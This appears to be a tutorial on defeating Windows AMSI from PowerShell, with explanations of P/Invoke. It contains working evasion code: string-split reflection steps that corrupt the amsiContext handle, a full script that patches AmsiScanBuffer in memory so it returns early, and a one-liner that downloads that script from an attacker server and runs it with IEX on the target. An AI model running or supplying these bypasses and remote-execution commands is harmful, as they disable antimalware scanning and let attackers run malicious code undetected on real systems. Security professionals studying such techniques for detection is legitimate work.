AMSI (Anti-Malware Scan Interface) which is available in Windows 10 and later, is an interface that integrates various security applications (antivirus or anti-malware software) into apps inspecting their behavior before they are executed.

There is a writable entry in `System.Management.Automation.dll` which contains the address of `AmsiScanBuffer`, which is a critical component of AMSI which should have been marked read-only.

## Background
AMSI allows run-time inspection of various apps, services and scripts.

Most of the bypasses corrupt a function or a field in the AMSI library `Amsi.dll` which crashes AMSI, thus bypassing it.

Attackers can bypass AMSI with `CLR Hooking`, which involves changing the protection of the `ScanContent` function by invoking `VirtualProtect` and overwriting it with a hook that returns TRUE. VirtualProtect is not inherently malicious, but malware can misuse it to modify memory in ways that could evade detection by Endpoint Detection and Response systems and anti-virus. But, given the high profile of this attack vector, most advanced attackers avoid calling this API.

## AMSI Bypass Example

First step would be to corrupt the `amsiContext` handle in the .NET `System.Management.Automation`, which is used internally by AMSI in PowerShell.

By corrupting the `amsiContext`, AMSI is disabled for PowerShell scripts.

1. `$x = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils')`

The snippet above, retrieves `AmsiUtils` class from the PowerShell assembly `System.Management.Automation.dll`, which contains methods used by AMSI.

Here the string concatenation is used to obfuscate the detection by antivirus tools.

2. `$y = $x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static')`

From the `AmsiUtils` that was stored in the `x` we get the private static field `amsiContext`, which is a handle that AMSI uses internally for its operations.

3. `$z = $y.GetValue($null)`

This gets the current value of the `amsiContext` handle, which is a pointer to the AMSI context in memory.

4. `[Runtime.InteropServices.Marshal]::WriteInt32($z, 0x41424344)`

Now, by using the pointer we got and stored in `z` we write some value like `0x41424344` which is a hex representation of ASCII "ABCD" into the memory location.

After the write this now holds an invalid handle, and any calls to AMSI functions will fail, effectively disabling AMSI.

But, this method will not fully bypass AMSI! This step disabled AMSI within PowerShell.

And we will use this, now to execute another attack which will patch `amsi.dll`. And the first attack will make this possible to run via PowerShell without being detected.







```PowerShell
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

We store this file in our server.

In the target we download and execute the script via:

`(new-object system.net.webclient).downloadstring('http://10.4.10.99:8080/amsi_rmouse.txt') | IEX`

This script patches the `AmsiScanBuffer` function in `amsi.dll`.

`Add-Type` dynamically compiles a C# class `Win32` that provides access to Windows API functions via `Plnvoke`.

Then `LoadLibrary` loads the `amsi.dll` into memory, and by using `GetProcAddress`, the memory address of `AmsiScanBuffer` function is retrieved.

Afterwards, by using `VirtualProtect` the memory protection is changed to allow modification, so it makes the memory containing `AmsiScanBuffer` writable.

With `Patch` the bytes provided overwrite the first 6 bytes of the `AmsiScanBuffer`, and then it loads the value `0x80070057` which corresponds to the Windows error code `E_INVALIDARG` into the register, and then by using `RET`, it returns immediately without performing any scanning.

What is `P/Invoke`?

It's short for (Platform Invocation Services) and it is a feature in .NET Framework which allowes managed code ;ole C# or PowerShell script to call unmanaged functions from Windows dynamic link libraries (DLLs).

How it works?

Functions that are only available in native Windows libraries `kernel32.dll`, `user32.dll`, are written in unmanaged languages like C or C++, and `P/Invoke` allows your managed code to invoke these functions directly.

How to use it?

1. Declare the unmanaged function in the managed code using the `[dllimport]` attribute.
2. Call the function as if it were a normal method.


